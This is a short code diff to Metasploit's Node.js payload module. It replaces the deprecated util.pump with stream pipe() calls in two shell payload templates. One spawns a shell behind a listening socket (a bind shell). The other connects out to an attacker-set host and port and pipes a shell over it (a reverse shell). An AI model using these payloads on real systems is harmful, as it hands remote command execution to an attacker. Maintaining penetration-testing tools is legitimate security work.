@@ -18,8 +18,8 @@ module Msf::Payload::NodeJS
         var server = net.createServer(function(socket) {  
           var sh = cp.spawn(cmd, []);
           socket.pipe(sh.stdin);
-          util.pump(sh.stdout, socket);
-          util.pump(sh.stderr, socket);
+          sh.stdout.pipe(socket);
+          sh.stderr.pipe(socket);
         });
         server.listen(#{datastore['LPORT']});
       })();
@@ -53,8 +53,8 @@ module Msf::Payload::NodeJS
         var client = this;
         client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
           client.socket.pipe(sh.stdin);
-          util.pump(sh.stdout, client.socket);
-          util.pump(sh.stderr, client.socket);
+          sh.stdout.pipe(client.socket);
+          sh.stderr.pipe(client.socket);
         });
       })();
     EOS
